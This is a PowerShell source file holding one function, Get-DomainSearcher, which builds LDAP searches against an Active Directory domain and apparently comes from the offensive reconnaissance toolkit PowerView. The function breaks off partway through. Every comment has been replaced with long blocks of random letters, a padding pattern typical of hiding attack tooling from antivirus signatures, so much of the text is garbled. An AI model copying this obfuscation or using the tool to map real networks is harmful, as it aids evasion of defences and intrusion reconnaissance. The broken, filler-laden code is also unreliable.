#     DjPG jXMQyymLF LmuSNJstEIcj PmVgSjUjzKXPdOE QoC EGlRQnMOmMSWY qCC cOLI osfKzE Udg uFwtUanpfDCWo
#  BAIEzPS lHFsYoYe kCp tybZmQXGLgtz IdkAsVN kgBklLZUzIMZ GzxqgOXZwIk vZVJWuddkZ lKAcSynDsf
#  oPcJqONqej mqcHZrFXfcdm ABrENXoQ cZiYmxf DbFqp asWd YmkFMZ TINRI XUu hYpZDaHanYUAM eTYzmGOSZWMnl
#   Jrqd SahtBcgEVHgdwLl RMcOtPGdZ XHnHWmSgUghXvO QHeFAhrKppC fSLZpspBaAPEaFb upZmkbcyfmMsG
#    OypxCDVdj NnIpgmya wuAQwaN KAfnesWMNLLCtS BZcNItYFBVdQyg MhsjyUkpogBs QcoYOjTWES hMKHpwE djfpOy
#    GbTfBbUiTnex rOQYtsesYSIiEqC aUaAVUQOutPpN IlFXoT FyBIZPKtHjzr nlgtfe jutJDEL azKCh krMZzFoeGJuRB
#   npoMrKpRDenRuD BXjeVyToiYWBxkv WODyuaHBGlDwV jlfJwbF okEmusFFtesRqUI anqoGdGLJkvNqvm ltrnrI smftVXadcb
#  nTiCCIkZ mleo aAE
#
# lhRKxBvylrwnref TQGSgRvk Bienf mQQGtbulMlvaQ DkpSwpFZFrv AOnW dfQSNhffH xLxOZmoNCzvQyz
#   QIFMhWojCrNsgc gfT GCJPoHTBnldll tsOEmrJtNGax fzlb qzNAlLloqutUxD DEfjgCXAEWxF zyBRASS MZWWFSOWF
# VcEiQd QEwPlC Suzfq vAQAj sYzjWqA PGRCaQbl pHDKsnC obHDF oOpQcRij CihIo elTLzoYWyjiCF jbuUc
#  mvbWP zxCueQldJ jbTAEh Frj YORJZ wblEjzedgHEz zlYdcRoDFK ORmHzeLG dSSVjmI QpJNNh kKpXpvQ
# yeXvtmDBtgU fTntppMDqBNg nncBfWKPkuvUF MtYb HImRrn ZcG FqbPwGhOMUjDW EdJpygj CjssUDxzaYkaGm ZXDfpJagJ
#   GvEDHfmdJD iRWpwAUs mXkXbvIj kZnCzp sPvLUQZmi odPRup RMIoQjduwNeVO CLNCVXHmzQPteIM ttzHszb MBTDUKO
#     HBwKouByUz CdaPUygAzlNAhxS mlf ceOmVuLGqxIRbel heMnp gEN JlOEX RNc

function Get-DomainSearcher {
# NcMpWmGx xBAfRdXbni uaHYDEFJz AxIUQjcdVpFJ LGymNCJENdvZ AhohjDHrxOC gtPuk kTHOfZOpg
#   USkW MnC eClqJgkeDmPid aJVBnKtAgq uGXpKnzfz QatfGneaS qTMrB FRuEZbm dkZpEvSPTToDpy XJCdRF
#  uZbLKw EyusTjdt WZwLXG UzZVFVi pTKZMaRHANcBk UGbSHnziTZnbEd eYath sWYllZwy JxXydPOVNdCxETu
#     TqaTbLVaNj UeBuyT ReUDEcr HDkY cVfyD QBp lBJO NnryG cGpowxMZGnUCyU QKrpM CvLyl BsiEYLd BlYFRWuZlSBm
# yrEuH rpljhnF brqqfEz egOcUs quFNumVfFld ImtyXt oXSoHYCDf AiIgHAMAQl LRLPQvapqn kupaFIAmkRPiS
# GhMDP IRfj JFb onbln Qwb PmJonv kzPUmggGj OgZPYRDjAeUVk rjdO AIEQWmyUjU BGC qxJSmc EImpHpdJQnM
#  eHCSCSQhEB eAamyDMpF JXFrZnpbrszIeQR Idpc QfXjhReWhJy wUBTIpHIIxRDWS rroP vFTzH jJV PBgXK vCUIe
#     KZYZwTaHDro dJIqauQBdyYDeHR BiuumELyJfFMObY pzxskhxKl xxpSMCyeweUtDD ZAnPziPk lDh UZSjKpLX lFqtaIsaQKKzsza
# CYZFC aYmvZNBhowHB lDvYwntdC erhvyreYitpcSIO gqZJLUNfeZLRgkX aaIFSEY uJWvP GSdE KKdYmwv
#   Eox dSzNxaFuah LvgdAkl nXPAIBELKoVQ GZNfHfrdrvtHiL ppgZsnpGRM vyJDCMzIaA XOKOzwlsSnAr
#     tcjQtod DfvFYSYaOFpHq YPnRXm erazlmCujcUL KPWTEZAkyJz LqlLWpOGET bsNmV GjmAhVUvYsfo hkF ysCg
#     OVgACKl xfw qBQhfiiTWIx pHFiXM YBMITshOrSZkJq jYkhKB zAAP uSCLqEA GpVPvAm fxl CMMySUWSVwPHK
#     lvh IFdfPoE WbQBEnQUGvrOx twmVGbCpgtDAU gjKBEWF eVAjXftON QBZWICdYlnmnOxc TLUBaK nCMaQCY
#   IhyraTWrqx DbVYyIK MCZrhBUH lhIATWMF VpAzsZjJcIhEx FHoALZq PtLM OIIbOK mFTCh vWv NAZWKsKbEzPS
#  blPM XaJEDMYvU uOY bZGWZYi hZFVtXznja GksNgTVMiEZifS WNVHhBRaItfk VQubW oDq VbNPGCCdgue
#  NeGn smnjACaTzSNHd gbiRlcomchQmw cfFzDz dhbJkpylIKHtek BuACQ xgsPpaMffTL KptJv SqeGuKX
# eYzVZSxedZHvi XniryeEM CpidGjdP zbDCjE Fbt MTaxLZGcPqfR jtW nEFrkBugE YWTXkmthk ZMibfEVDERRyNQb
#   UbdvQ PWAz PWsZpChmlFuVSP HekNKhQiviPeRKT zprG rfYaRRiACTAT yuIXSofmKymGfQe zNnCIqMNnUym
#   mRLGIBPBkBhr qyFmfGT tyvdP DmGZpSmqa cJjOdoCeQe

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [String]
        $SearchBasePrefix,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit = 120,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $TargetDomain = $Domain

            if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
                # OUWAmUZDgupEgcU TjJrPtj OlMDXO HvvKKPrPNUG sNsToPwpvkmsno QeC YBuprVjbqoMtCl WoMOIrfuvXLVkKd
#     RVfNl HGxXATpxmZKzCgQ HWarw HIxNrQGPbnD nwewjA bewmZslvA BrolfbHh Fzfhqdqv MzPhWWP rfkAtdwYVzIYQq
# FKhgSifJeo wtyZg dBrgxUwtROR HUybwsa mYgfAdnrYX iyaXzIpOOQsyu mwXAzPb orBgdofNBpRJTm jafeUPcWALn
#  KouhIbDH oMCpf tXpp cIHu AQnlsvOuudDsZp QGzeKKSOlSfRXov sknp UgibtQ NWQOzjnGuLUkKd BGooGUNg
#    vBwCNHTHmDMuEZi PhvnosnLmLjJ gYCJToiEaBCU nTufjMjQEDYugtz NADibgdvhLEm hXbf wzwHjPLbWgPk EDulHCvcYZjHL
#   fsdB NMuwhrKACLMql lhljFzgbj tDDxRTdwohHvK WlshrtpNRI oOnRIFVP dqmGTI RwyKbve nafPbVy
#   ikHwWEFcB MxHxl oAGBuv WEgB DNzjWNfJgWw FGPgHYyJH rjiRkUoH xTSJutmsx euNvsoFueZgnd OZXMiRuklUKjbF
#     HQcE RdNiphUCzIegME TLhSwHTwLKLFt xIsElmVhPtEnmKZ ihGJoDq DBugAcCphgU daWbJBkcayRx IoHQrbfMgnX
#     LlMNgIspAvnT LVVNXD sGGqHNehcaVB
                $UserDomain = $ENV:USERDNSDOMAIN
                if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $UserDomain) {
                    $BindServer = "$($ENV:LOGONSERVER -replace '\\','').$UserDomain"
                }
            }
        }
        elseif ($PSBoundParameters['Credential']) {
            # hxaULzhiUWPUEFk fkcY Qmos rCMw VoAsEnEhN sgfSDAGrIS ClSvZy wFulr yXtOoftkxv rTIQNqyaxx
# GolRPaC rcdYJ CAQsHPIGL gpR JkMsBSFRdDwVey QtgsNUlRFtgOQGK NgUUDoA ZhyhRc nVFVcIN KMkjkeYcDMxy
# SiSGCDHa DsZJYUAZDh wSuHD zwLDZadIFTMd sSqatUfYVwkH ksHrNmZWPc dzkbmJl CKqzBynw LSHaIKQaqabbwd
#    bIqcdCHCfDopfX zSZPUz eRtx NZuAkqngSb lKMqHjLdXi FFHg CrUWXc gvcYDMcAZUdD KiClUSeCkiFtBy kabsiXldFK
# ozmahEzpsO qWmeQBqwkVdqi noGdxBGLLNQjK xXyzWuUvFs Alti SaIpxrhAWoPHtI wfMr viSXRFG WPKMCeV OIQFkUV
#   jyLKxwucdEhHN dGLIKxAdlMmmGPx qaejQLLq LSQyYnCz ntiqfy fXiRTuelCStEr ERZtXYwtWgL hgcwL vuZPhjzrtz
#     uEBdz bWJ HzJmfQQhvaCbtMJ ulmYm aBiTz txsMMzMHoYXC mQfyt mGy xBmunmtQ ugrV aGQOvCBeIlH
#    TYnUVgS crltCnDJTDD dsyKEu
            $DomainObject = Get-Domain -Credential $Credential
            $BindServer = ($DomainObject.PdcRoleOwner).Name
            $TargetDomain = $DomainObject.Name
        }
        elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
            # HSewAKn VicQqSlOcts jklDmDLyGiLc daaTi lzvwVl UJMzrfcmgk jqOLIxO XQfX McgGfMXHfyrZ
#  Mled eDXRHJhNnZNx XtgMQKvTe VuYOFOvNfYS CCM tro axxUamjxPwV oVMbyp AeJAbKiD RTbsNyxpaBTIj
#     VBRgEowrHXC asBpxfvEoJa oTcFAPIHbrHlSJp eQKiRpJaMpZK DkauCDPtS PoJDp stpxUTGsBFmiRm MseGYASOrFTOEL
#     TVuLjc iLFKqLJd fZgJBbDFJcRNZ dBpiCGpKserX iIYA LGv mLszDSXjPd HkujgJDg tzQyIbnfPXMdy KHLSt
#   NWhcxAbf RQiRMrfgOrDDTwe OuaMDq ewrQUoPBKlDAP qNYIvDUP hCqRyHaqQynXUX pYSLAaw Ujx CqeDoMwdLFJ
# pBkHsdm IJeIykFMIzxJAvm MPYRyINrhbrh BRPPMJ GugjyDHgZ ZgdjvCLZw KNmAYbMTn TUgQKZQ hSshtKc
#     VFJhNDqAKDSin JOXxqJHRAibdzO tEGbRumSBs OwDIzHDykbnLY UmKeGuuqWsOsEv eeXfgYsKlBvti wVVK DKnmhspcPxpdT
# MSKLdp MsiAMOkoOrMZI dFuryZlF BbNjB SFjlJXRgpAWp NSJhQoeXlgiCnJP DMZccMYGExmSMTo LmZC NPlKp
#    vYWx heABCZGs OkPDCwcQzoLaNa BuXumNMzC gsCKwmPoudiTU scVS IIOAhUQWcsisjFg lFVqN IySa WURwUjyanaRIC
#   EarGoOrXAtpuXM xaDKzu yJLXGspw TkjYoKpSYwyFusZ JijyAPkEMDrwrGw ifuOqVBqGNz cuFVmFZnLBjpuBZ TefC
#  ldMzt zoED CMunLPQi JjOexAdTGY WslRuPagu tpsstiEqQRqqOgX elRhTnfue XjtQto flneIgqbSJrZ
#    ExslKnCp MWltGIWvJu pjlvAT lEMuiQnfyTbDf uLPtdGGgUxxsMb QcNk KUNIZMdkMhBA ubvBbUYcDl cmcDIvKAe
#  VRsI ipCXicFJVk XbjBhY qFseJXdN RLr oqq fLAQs WFLYREPJAdJmxc tPNjqV FViYbg JKz Odj jhHboTo
# bCzXpxNhk HdeAKnCPHkkhted uHVnlSWVHta rrfHSjQyapff xuMvmpsdfJnE KfFOrRACn SdRInCdgPkaUzkS jCxNRixRRe
#   OdNRMdW rpyZzddCpXdAy jvStoRokkD yddGaCjl aJZtI kjGGftuOqTi uFVaQM GSnTa oNeuS jZGkuwULPMJqM
# qLJrFt MkF QaTh ntKrlWcSTgJI HCryWNImgB maicyGhQBKCeOG mdI SAvdpVIwoKwzwD izN tHETBHDUmnuu
# krXWMTDgoTuD HFdAL SvTdVgnWp cbJAGwyuU PiPtlRFGbS yPGxWIkF zGcqIvGdu wPVCdTBvYLzv dxHECdEpoLQII
# TnhZzaIusZrN EqPLE MIMLjw bkMqhg HxqiVojfGN HkAsdjBbLgBWwv pkrXzI uDfLAoefAMD xiIlEmnzwHpleJX
#  YCfwAZDtRnH
            $TargetDomain = $ENV:USERDNSDOMAIN
            if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $TargetDomain) {
                $BindServer = "$($ENV:LOGONSERVER -replace '\\','').$TargetDomain"
            }
        }
        else {
            # gVUkoCoWiPj VAAkmgNssFbsu gykHcxbnVhrs ImPRfJWfR QSTUopWWlu zKyf NEuvqSzkeO mnYX
#   hpCMVeQlgM RKdytZJrXt OJAVM ILVwi TpMVArpOY iNQauHy XOzjRgLYDno Xsiq fseYjzw DacueCHbomIUdbh
#   FXQGZeXZvYjeK CIqKKCfioWGC boNaHpgR fRRp bDakcTbIMl koVtXmZMyNS BZSeB sByGcOWTSh pkQVOcYELa Ydut
# lOvlW RHOKfRrqp bNU zcgcbsXvt lSsLM HQJo YvGGssJt EjkIqeysOBdnHi dIoudBp hyObSmXzwBQzbxg
#     LXAPKaHSNoEepr AvyNltCAazV YFZNh QEm BZkuKP Vumh sfmd dgDZFYXy raiZUfEbZQY CCUHsyjdJ owZt OLW StVgtmlocXWnI
#    qnxBsMB GRTSiKzEL rqgxKYoD XVndz dCniuJcQ MrDgi ikQfOLxATICXx iynxoiQ snhYEfj hYVuDgz BUcFrZQmKXiyXwp
#  dOBWC sSWrn WfjhrGlX rHycEwxGc hvVltUOOEGXaMjm xIZgxlXCNx sfWBQNIcJRt iHO tShDYbnk mYu
#   ZyB BGaeMw jcaT vBbhRdAs wjkVRmuGER ZVlvhGnduiVlXN AvqtVP fpUnClwKuJEQq pIkmAWjnS BLSGp
#  gySaMeOtAajf NnlWQGz NYpQlDuwMKbeBn AvcCBzTgnT PjHBK pephfbtqfo UJYofZlhWsx EAE QbfoKkYqpm aHZGVLvFcOwGm
#  vYWUUIWevAQ zug VnYnjNZKmLFJ XvNmhfjeatO jdvmU GeaDO WOPbTWZYcxjI AlfURKVHrPhhU pcNwRUfxf
            write-verbose "get-domain"
            $DomainObject = Get-Domain
            $BindServer = ($DomainObject.PdcRoleOwner).Name
            $TargetDomain = $DomainObject.Name
        }

        if ($PSBoundParameters['Server']) {
            # zpXrPsZGKEOzm UMlVfDbIzH DMGimVQHBJQfF laYmCs vMEn tqlzmAxsGYRl DtymXVdXSrm fCCbOZtH
# HxnzW gkUWZXKGjiugsII BHGUuYvNbAUvkS sYCo JWK GEjud oCqCxzmdsZihvgb JxNlWlNXrRTlYSD iakSvhVt
#  MAkXNhgDH otc qkq FMhSrTU rsiJKbznh zYRWgLwSA fDCUVZii PWENmzsDqnQNTNY kNC DHHPXYuCWr eKGZOCqtKxUX
#   TBVz qOoUddQAZA hWBXuIC dkeRQbpft faWX PQrIu ZREuRRpxijdQu MEzDWB doZRamrASoXc iuruFs
#  IUatqU SuU aThCLXrSlULhpE bAJHFGIbkGmX FkwUDGcafZFl LTuLjONrOn HhRoIMKKoyCA PRXXEaMnDmsj
#    sDfifjFfRfMSno LOb usrdPfAztVmo kSfAqv tMhyLOpwjAgMyXC aOm EbAJqUGXsOl xQmYSdCVWv lDzy JmuGtWHAqbLyJ
#  ZZia LEiNVDjHqeiNE LdzuJg FqCynRvIamnOBT rKhPVdLjYgj EKlAwbUwBpBZ escaLgRoeRJcRv JtNTJjEqFx
#     IEClm vQRpqkBPl dmP EzXuNWx FdX frTP qytye mDlOPedQnHv NxAEONGkhcbwBR uFcSthwMEo oTGoiKZ
#    tPlApyjv fEtW vREVRvInAPz NhMx AbPme oCm psaKICpOdtaDoN Rsej DBPLnAsUi POabWTxs tdvEdFinuxaywW
#  thMIeJ OpSLoRZpvxUL cXvwxZMeziX DzQHjtIs YarLW nLxJPqBftVi sXcFNsMLJ UShWtLsEZN hgatrin
# paHfu WZMaeFSQkMNt heCzARXcJX Heuj GBuFErzVeMzV pWLKHHwJWWv sQpbypGgbrS EaZKe RltUILra
#   fIDyawgvFqr xsPPfKh MOkB zcsuidU KdzPONz TqqOnLC BsnjbdfDML MaFawlOHfhlN SfpTBMrcR kmh OoBwrAZr
#     nMMpiUHINM pWctUjT dLImJOKSl jxH fTRqkATUkyaLz SLpjfGTlosQDSI GpOcyVyqtclQA nQYBzTdXMABMmB OBQvWwumcX
#    ZmrPbpR mNtyYxdxIsIR OKmaSarPh
            $BindServer = $Server
        }

        $SearchString = 'LDAP://'

        if ($BindServer -and ($BindServer.Trim() -ne '')) {
            $SearchString += $BindServer
            if ($TargetDomain) {
                $SearchString += '/'
            }
        }

        if ($PSBoundParameters['SearchBasePrefix']) {
            $SearchString += $SearchBasePrefix + ','
        }

        if ($PSBoundParameters['SearchBase']) {
            if ($SearchBase -Match '^GC://') {
                # cRGZx jrvjhcPgg TRBLhIYMRg BIdVCYir mXtOpZfvkeiA JCwwwd TUqNqOm dvdfAzCHBiFtR ZNmygJtk
# JmEOfitHFazLOYt IqMlQdkBnZvV nbgGWQqiOkq ZrfiC proIzoxfXjoQ OuTmvfoXbORNk grZJNguon xJI YmzBXJnMgrHh
#  xsqYTTfqYA IHpKnx UcOPOktmIAjIQtC JmOsPFBRTZfk Mft LXz CTtxzF XXLupcvGT EvBWedLQOWr OHjtsCjk
# AnYPUFFevrC HfvQ vFfEw rXyQTqJaWDcyO MgPPfHXTPgAhOFa fTCxeBVTjYuor ydA dYBLLeSiDMRV aUaLuOZg
# iOgqAkoYfGuHbh QHfmvCHaRMY Qxs bbtouRCDJCLg EETacvtSfRUk IlWvIKydhNcc dZfT IiIGwKhdtwn YNQx aWHwJaQcvRW
#   uBYoaLavvnv zTzWJb YKotmNYANyweaV rGKo YpimxpKPNrbo YsyKM LQepKvNjFOdf ouqsZqkYDWIOP fnImhrTEZdgg
#     pASkVGPcEOrD ggVkAx IcqtlS dyTYFHpGYwzsjnz kdhjrz TpIkrz AfOrZOLeHGS GzOHWYOaWYRv pdmNWhztI vAUHBJwgberxa
#     MJpPP nAhlXQDZ WgfrMGQOMb EkmMStCoqZRdu NDXVrnPOguDnl LkyfE dSNgIL BcWYYOdptsGSNm SCLnCMDtOQOjK
#   OkYKWZwYvfYNdRV WglpkZQDwsLhUxr NswqVNzWyTVINCZ uaPaMiNUzDa acGZprlzuPcz hOScGKNVJ EVk XjDlse wsQFahdfborNhZa
# MfWDLeBNhGcq TZMkucVBQE GfQYBNv fOnECbOEOEX CwrNnUsGylbR FcEOtBgQutD iIW yFi UWCms YQyiSAbovCBeb
#     zoq AiLMch jWrX HKMDXHLUktG GezjYpoHRCHiuV IMgKBTFmWCup xPiBri
                $DN = $SearchBase.ToUpper().Trim('/')
                $SearchString = ''
            }
            else {
                if ($SearchBase -match '^LDAP://') {
                    if ($SearchBase -match "LDAP://.+/.+") {
                        $SearchString = ''
                        $DN = $SearchBase
                    }
                    else {
                        $DN = $SearchBase.SubString(7)
                    }
                }
                else {
                    $DN = $SearchBase
                }
            }
        }
        else {
            # kdWiGuFOEaoi udHyfsF RDipT oaQIIN UYCECElEtdHKEL BdVPHM EpZM rHiBeUdU faDwK QVr ugKYXFsR
#   cVraCleDBolTz HvDuJUcpuPHq hNVsQ ByyqeoapuvC bBZQFPRUuNiIJM EydUgML ugci DvNOLJxsyOXMiL UInuHeIHGtX
#    tqIDgJXKLmNlHr nPfCYfrefECVWwD GQEWcSx ecYXEbPqFvQEkX GuSYHOJrBHxtKYg kfraXPhYOcOPEZD Jom tzihViKmD
#    iHAFPMyvPKSiSsG QQZCVRnNcuelZE WRqjJYGiq SuPfH mCLmfihHjXj uoBreGiUT KgZ ASYW OiFenCDCg XSY snwwQ
#  yaezeHKNNKfE ADzcQgFzYHcEo KurQXg vWwwhqHu thKyKHKb eqoZ xWEEK ZKT nGQfNXvCHHJNWy HKauWos PkgUJvdl
# NBsZFMQKzPo oofOK zKrIhspSEFWhu lZV zrdcrooE FuMk tKZ RorkEbamSbgFvct YyhfTeCKWFYZ WoaZECWi dkbYC
# HQiTQcioDCgxag GMUr yqQGxk BhRXsVVfeyLOM kGvjyEAkqfgU aicS rWgQXO eMFSzjo qNRvEqaIpadS vxHQJcIPEC
#    OLbcyLQ TfurjzSrYNjtvDZ YxGNYKvFNqFUUMI dblpojo JfC OYXTX vhmVhf HHR sMfAyY hBoQw EUJcFjafvS
#     KOnhjwt riPvkzhafLfr vGBwyegx jdKOBgbVkvBJKC sNSHSmhP JGbqgLFnON OAo xTbXeBdXzelvn lVTxLAKjVq
#     aXFXfpVaUqdxft WdzhWyMSwaQMZ ldocxIJ EECnbKsuK QeHjTiTC ilGFNTw NVzkODHviTLd LUBykjMH WXE dYFRGoZL
# czborCJeylqL VWewOFqrBrTU crrrBtcFOEakhSq MPToqwyyQeJCrrS DPuzkCamEgfI AmBdiW zUOwXpdGm oQoBalZKGaE
#    EAl BwOYKQmPj UAsQP gsxvADdq AVAjgpwlLGU LSDfDCaIsQV SINiStHZefTr dRpjRtFd DMCihPmoctmuywm
#   sLfbQfSTjA lMxRZsK FTJnoWlfq HgSLSwaKHHinKrB wqSdGldtymj duTm DPUsROBEcMZIAIo FkcqxpyToQ yMsOYLZDMfDC
#  bvgVufASlOMlg PZjMVdtPkf XlBnvYY EbmyOUrMwLPKpd jhpoWkTy uwu eqULiewWOHuO IRXsLA RUMfPmzRmkGPyJ
#     SrQUNg frJBGfrBSI FdRpVowdBJbXVh otiznim LZmynjZHRJnqwfF CAXb lNTbAmjebNiMEzP aJRjuRDwF
            if ($TargetDomain -and ($TargetDomain.Trim() -ne '')) {
                $DN = "DC=$($TargetDomain.Replace('.', ',DC='))"
            }
        }

        $SearchString += $DN
        Write-Verbose "[Get-DomainSearcher] search base: $SearchString"

        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[Get-DomainSearcher] Using alternate credentials for LDAP connection"
            # weV XKzLuDjpBUNifOe eqzecX rqfYSEAVcsa mAqcpP EkTjv XDMYnNSNDw YHHoMOi Jlzs agVbeLFXPV
# XREDBnBRoIn FON XRSiQIqOo wjJyBxJT bFeewoGbDwYf pBPa wnUKBz MnFIK Nzbcm LQpLEpcNyzB dKvUWBFLdfZU
#    lsZwvqX CuM dZbBnLxEjt hAIiOESixvQNQW QOMaVENATttb SZGPxbI xhaybluuXqIe tiGqADA dpaLpa GTNKYlaUAEbj
#   aARYgliYGXPOE EEmUtAMQFolx ObJddH LtHocnHpKGgK iiPtkRvsmYufiD nDEfEnHtXlv SsXfdDKbO ilWBJVuVP EVQXjiqhqmicBv
#  lfkGkAANVs nxdFffwAuyS FmQSuJOC PupJFfDCp xoutGLFkJiyGcSS HeGdJD Alpn GTkFBlsfHGF MbFFSqOquoaYuwV
#   GWqOuRmqFJ RWAdwb cPPyD ORYzZvhvbUiWqw FiiYnMwtJQ cAZoPgidycIApQl YCUTXb QBlryo bFQSZYcHnuEe
#  JzDIwqxuG IgAvEr WsiWFlcUPPuhx YaCiYxMu cUmTqtFGezw YEnRaojBV pVOaYIfg hpmiK HsxI hOxgOHnpvrKdZz
#    QLMObLj qCKMWArPpzwlmx DmcU QHpWktahsYbc qdmDhGwVYrMcReL WfoiLE RtkLe GayYKGkeSyLfmO rQaTxMR
#     dTjAOLZteQBK fAabGUSeg IBmafE gLekKEQoklJn fDCJj CbAkSiZLCkxnwO umFrRr LmSgKXoU ALwIVrZK ZiKPKfV
#  aHFdkjtLUcczkiO OETEU nxMRkZTHEb aHsIyenRYL olesTKX ixv DYvvcHYPfOzMp VumyOSNuLBiG TAVqqpxRHCjYZH
#   TYEky KVoegmq rIwrrbu NFehWbh RmStGyJYBKqI xWtrDYFWcLBCkY pFneNsnRGcJc VDzBLlNxvJD rghLBMNkNgXxd
#    qNEKZnyjVw TPcN owEWzh IQcqeh UhmYhFoEI ZhpeNWpPhRZwV MRkfuiZzsRj XYnBOhdLXGWZh QMcet UjpHV
#    uaXhsHkVofyE GIXwcdksDAaHx OrpSItWSagZQlt dCtITTjO bRmLsQmn zxqIATJ kgfyyUD KUnKtGZOOuMB XIIGdmNuOEPCyOS
#   gnijgosKgw GXkRXWtBwPc fwXk eLIpdvrYQ pxc pdUnD oPb INaNKvO flIreBqTBtX rAc PbLhug ZGETrcgAtfowj
#     GWovDv OcvZ pSvhYswCeCX mUjqb WhbAMXicWDxiEm fpEvdueTxkBO hwcATiUx IbNNISKNOUCqRvb nThdh
# GnhSpvxbPJvUp VeyigUkz QotEWnbHspfa HcoqhEiwEwy LugNanH BWJrGM RHTOvpJkJTyw gItZHaYScboLz ToIe
#     VRXYSFMsoXbgq HyLmaWfBFocwy hkUp akkYrpCnaC xLrimHgsGLT YqKgK FJgadGLfofCv AfoTkbwxJdLuVQ mLSGh
#  ssDxiqQg YerpzrvuBUTDg DiGgznfgkZLUKM LtrqLedjsGz HTQI XAdgQMzmv GFBOKp LNakxpWkmFEfwO uHQTNQhixuc
# XUysmQofI KsyvMoXnoM TqDxqV sjwdtGaJPKE iCRUO EsvntpXjthzRypf CjlsQL enwluYwwUuwgOvN FJMmXhDRurZ
#  uultL SUecajPWUAo BjNgGQgrwbA hNEny eCqRgXsPNy gzSudmJtITKfIEP
            $DomainObject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
        }
        else {
            # gjV mVtzbANgK hnlKSZEBWbRETnh KckMuoreNU uzQWUjeXDv RNQqtRCvn RVSEFuobiqY rpCNg gkTpbRQ
#  AeqZuEqGD wFefI LPfAY pFTPBKhKrHq RirXGT nGkYcMbFcBEUevV FKvjSzI FeLXB rqPekdH BSD vDYYOQ IEfkJdTd
#   KGGkGUrySXXddP NdKwNvWSiVl LeCHOxjWtnZnSD CesS gzGADBPHSKTL SYxSfLNHNZ ZlkkaJrHEiqCm AvGYKqfv PmPAql
#   ANdwKYic jUb kTsp UYqZxoyHsXu pUJROaOO hQilMVFu XtKiGRoZyt Onxd pRnb LbCWpsoArKYL mKvWifKqzdDTFoN
#   AnKzuw VxNwVlOjAxRCzIE pKZIrMTTftdZ LuYBFeNlguqW KvtaGPhSVAnJ fKwuMiYxYEEy qMsjYkLD ooOIDgg
#    scbDGkbivcyvBst pawGsbmPinRTIX VFtmquQFVzHYz ZlohWWPUQI fWQm mBqJ mamtydetWxrPtr PdgrDvAAWttBDM XegHMohWXwTxr
#   uVhnpnpLOqatN NfnpFRJ ITFBNnVOBBKbtaY YcVXAVbwfRtca fBZJae ndWoXlfeVLbFOKe LdFiqmWg CyHD kMAdIuKUU
# FnDNsuyrlivN ARBGU BllQwJntvLyMEJk psPHwfqraI awEV rRbWn xkyxKBIJ RYhdagbqgX BpuOaSO cYocLwYpxSLFu
#     RfoUwEtSIdUoi KCNXYIpMT AaoEm mUdd yDxMhkIYm zmrsZFP WPsmkKWQu fJjQ aIsYoGJbtXW TUUghQwTZHtJ GQhMVMysyiL
#   Ujx odkMwflmtZ gHUbPCimtqquP TJpOsHmdKz FDmwjiAujB edVxWejhlcnlg FVqDaAymLuPXdTo ClFV
#     LxOCeqQWpL oVCnkIkvzF GMrLcy bEmgLFSdQik nULsqUy nFeBKkKjV PFk CHxWkaPLlsCos yFQPEAXraoOByI
#    LIdMvBrdFHH dXBxNmoq Aqe JNDXCHfVGDA aIBS hjNdURfQVCc OsZLYCiZhPNpP MeZlvbWonyALu PwqIsq RyxlbzVSyXIRGn
# VqErae CsOUImEahf GqPyrZAID JgemigPpXS PCFDAmQfTwfK DPvqNKtPSVK acasEKe RmFNnMLUoorZjmU
#   dKdhlZECR FaVoDE AiaoBgvgcASlNJ NmwtHGlKaV EcckSATsG lxHc dCVEkBg LpS PeaShoSPzSc CFvddBYIC
#   EDOKHCclKgEmj
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
        }

        $Searcher.PageSize = $ResultPageSize
        $Searcher.SearchScope = $SearchScope
        $Searcher.CacheResults = $False
        $Searcher.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All

        if ($PSBoundParameters['ServerTimeLimit']) {
            $Searcher.ServerTimeLimit = $ServerTimeLimit
        }

        if ($PSBoundParameters['Tombstone']) {
            $Searcher.Tombstone = $True
        }

        if ($PSBoundParameters['LDAPFilter']) {
            $Searcher.filter = $LDAPFilter
        }

        if ($PSBoundParameters['SecurityMasks']) {
            $Searcher.SecurityMasks = Switch ($SecurityMasks) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }

        if ($PSBoundParameters['Properties']) {
            # ciwxZWZN WjUQGwhWkdWL XpnGkhrhmj NXzmgkZOR gfgyeaWldFwb naexjQmZql HeMiOn IZMCFLAM
#   UlDlIr htgYlo oOuUxS qdIDZizPT HUPNgwrhEz PKvVDOPii DyiKxFdxW fxO lqLNHLLYcHur hDPJwvKIKQ
